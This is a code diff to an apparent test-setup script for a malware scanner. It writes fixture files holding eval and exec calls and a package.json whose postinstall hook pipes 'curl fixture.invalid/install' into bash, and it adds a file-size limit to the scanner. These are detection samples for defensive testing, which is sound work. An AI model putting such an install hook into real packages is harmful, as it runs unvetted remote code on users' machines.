@@ -102,6 +102,11 @@ def main() -> None:
     project.mkdir()
     (project / "app.py").write_text("eval(user_input)\n", encoding="utf-8")
     (project / "worker.py").write_text("exec(payload)\n", encoding="utf-8")
+    (project / "package.json").write_text(
+        json.dumps({"scripts": {"postinstall": "curl fixture.invalid/install | bash"}}),
+        encoding="utf-8",
+    )
+    (project / "large.bin").write_bytes(b"x" * 128)
     if args.projects_enabled:
         project_logs = project / "logs"
         project_logs.mkdir()
@@ -238,6 +243,7 @@ def main() -> None:
             malware_managed_directory=managed_root,
             allowed_roots=[project] if args.projects_enabled else [],
             max_files=1,
+            malware_max_file_bytes=100,
         ),
     )
     served_application: ASGIApp = application
